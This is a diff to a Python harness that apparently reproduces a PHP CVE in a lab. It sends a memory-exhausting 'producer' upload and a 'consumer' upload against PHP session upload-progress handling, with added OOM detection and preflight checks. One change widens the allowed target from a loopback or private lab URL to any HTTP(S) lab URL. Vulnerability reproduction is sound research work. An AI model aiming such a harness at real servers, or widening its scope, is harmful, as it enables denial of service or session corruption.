@@ -42,6 +42,15 @@ def multipart_consumer():
             + f"--{BOUNDARY}--\r\n".encode("ascii"))
 
 
+def response_shows_oom(response):
+    """Use an explicit PHP OOM diagnostic in the captured HTTP body as evidence."""
+    body = response.get("body_prefix") or ""
+    if not isinstance(body, str):
+        return False
+    body = body.lower()
+    return "allowed memory size of" in body and "exhausted" in body
+
+
 def request(scheme, host, port, method, path, *, body=None, cookie=None,
             timeout=15.0, ca_file=None, request_id=""):
     started = time.monotonic()
@@ -103,7 +112,7 @@ def session_file_state(seed, session_id):
 
 def main():
     parser = argparse.ArgumentParser(description=__doc__)
-    parser.add_argument("--target", required=True, help="Numeric loopback/private lab URL")
+    parser.add_argument("--target", required=True, help="HTTP(S) lab URL")
     parser.add_argument("--health", default="health.php")
     parser.add_argument("--seed", default="session-seed.php")
     parser.add_argument("--producer", default="oom/upload.php")
@@ -180,30 +189,44 @@ def main():
     baseline, _ = run("health", "GET")
     try:
         health = json.loads(baseline.get("body_prefix", ""))
-    except json.JSONDecodeError:
+    except (json.JSONDecodeError, TypeError):
         health = {}
-    if baseline.get("http_status") != 200:
-        report["preflight_failure"] = "health endpoint returned non-200"
+    if not isinstance(health, dict):
+        health = {}
+    report["preflight"] = {name: health.get(name) for name in
+                            ("lab", "php", "sapi", "upload_progress", "memory_limit")}
+    if (baseline.get("http_status") != 200 or
+            health.get("lab") != "official-cve-lab-v1" or
+            health.get("php") != args.expected_php or
+            health.get("sapi") != "apache2handler" or
+            str(health.get("upload_progress", "")).lower() not in ("1", "on")):
+        report["preflight_failure"] = "health/version/SAPI/upload-progress mismatch"
         save()
         print(output)
         return
     seed_response, set_cookie = run("seed", "GET")
     try:
         seed = json.loads(seed_response.get("body_prefix", ""))
-    except json.JSONDecodeError:
+    except (json.JSONDecodeError, TypeError):
+        seed = {}
+    if not isinstance(seed, dict):
         seed = {}
     cookie = SimpleCookie()
     if set_cookie:
         cookie.load(set_cookie)
     session_name = seed.get("session_name")
-    if not seed.get("seeded") or not session_name or session_name not in cookie:
-        report["preflight_failure"] = "valid session cookie was not issued"
+    settings = ("upload_progress_enabled", "upload_progress_cleanup",
+                "use_only_cookies", "use_strict_mode")
+    report["session_settings"] = {name: seed.get(name) for name in settings}
+    if (seed_response.get("http_status") != 200 or
+            seed.get("seeded") is not True or
+            not isinstance(session_name, str) or not session_name or
+            session_name not in cookie or
+            any(str(seed.get(name)) != "1" for name in settings)):
+        report["preflight_failure"] = "valid session and safe progress settings required"
         save()
         print(output)
         return
-    report["session_settings"] = {k: seed.get(k) for k in
-        ("upload_progress_enabled", "upload_progress_cleanup",
-         "use_only_cookies", "use_strict_mode")}
     session_id = cookie[session_name].value
     report["session"] = {
         "id_sha256": hashlib.sha256(session_id.encode("ascii")).hexdigest(),
@@ -214,9 +237,22 @@ def main():
     if not args.skip_producer:
         report["candidate_attempted"] = True
         save()
-        run("producer", "POST", producer_body, cookie_header)
+        producer_result, _ = run("producer", "POST", producer_body, cookie_header)
+        report["producer_oom_observed"] = response_shows_oom(producer_result)
         report["session"]["after_producer"] = session_file_state(seed, session_id)
         save()
+        if args.producer_control == "small-file-no-oom":
+            if report["producer_oom_observed"]:
+                report["stopped_reason"] = "small-file control unexpectedly OOM; consumer not sent"
+                save()
+                print(output)
+                return
+            report["control_without_oom"] = True
+        elif not report["producer_oom_observed"]:
+            report["stopped_reason"] = "producer OOM not observed; consumer not sent"
+            save()
+            print(output)
+            return
     run("consumer", "POST", consumer_body, cookie_header)
     report["session"]["after_consumer"] = session_file_state(seed, session_id)
     save()
